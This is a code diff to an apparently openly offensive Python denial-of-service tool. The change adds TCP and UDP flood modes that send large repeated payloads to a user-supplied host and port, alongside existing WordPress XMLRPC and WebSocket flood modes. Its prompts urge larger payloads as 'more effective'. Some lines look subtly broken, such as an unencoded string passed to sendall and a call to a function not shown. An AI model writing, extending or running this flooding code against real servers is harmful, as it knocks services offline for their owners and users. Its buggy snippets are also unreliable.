@@ -127,17 +127,28 @@ def chub_request(host, headers, thread_id, target_port, word, word_num):
                 print_up(thread_id)
             except requests.RequestException as e:
                 print_down(thread_id)
-    if user_option == 1:  # using socket
+    if user_option == 1:  # TCP
         while True:
             try:
                 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 client_socket.connect((host, target_port))
-                client_socket.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
+                # client_socket.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
+                client_socket.sendall(word * word_num)
                 print_up(thread_id)
                 time.sleep(num_timeout)
             except Exception as e:
                 print_down(thread_id)
-    if user_option == 2:  # XMLRPC DoS
+    if user_option == 2:
+        while True:
+            try:
+                client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                msg = word*word_num
+                client_socket.sendto(msg.encode(), (host, target_port))
+                sending_socket(thread_id)
+            except Exception as e:
+                print_down(thread_id)
+        
+    if user_option == 3:  # XMLRPC DoS
         while True:
             try:
                 payload = f"""<?xml version="1.0"?>
@@ -157,7 +168,7 @@ def chub_request(host, headers, thread_id, target_port, word, word_num):
                 print_up(thread_id)
             except Exception as e:
                 print_down(thread_id)
-    if user_option == 3:
+    if user_option == 4:
         if "ws://" in host:
             try:
                 # Run the asyncio event loop
@@ -186,7 +197,8 @@ if __name__ == "__main__":
         chub_ascii()
         options = [
             "Using direct URL (http://example.com)",
-            "Using DNS or IP (example.com or 127.0.0.1)",
+            "TCP Flood",
+            "UDP Flood",
             "Wordpress XMLRPC Flood",
             "WebSocket/SecureWebSucket Flood",
         ]
@@ -209,11 +221,28 @@ if __name__ == "__main__":
         if user_option == 1:
             target_host = input("Enter target host: ")
             target_port = int(input("Enter target port: "))
-
+            message = input(
+                "Enter message to server (Hello Server ! or what ever you like): "
+            )
+            message_num = int(
+                input("Enter message number (more larger more effective): ")
+            )
+            
         if user_option == 2:
-            target_host = input("Enter XMLRPC URL (http://example.com/xmlrpc.php): ")
+            target_host = input("Enter target host: ")
+            target_port = int(input("Enter target port: "))
+            message = input(
+                "Enter message to server (Hello Server ! or what ever you like): "
+            )
+            message_num = int(
+                input("Enter message number (more larger more effective): ")
+            )
 
         if user_option == 3:
+            target_host = input("Enter XMLRPC URL (http://example.com/xmlrpc.php): ")
+
+
+        if user_option == 4:
             target_host = input(
                 "Enter WS/WSS Connection (ws://example.com:8080 or wss://example.com:8080): "
             )
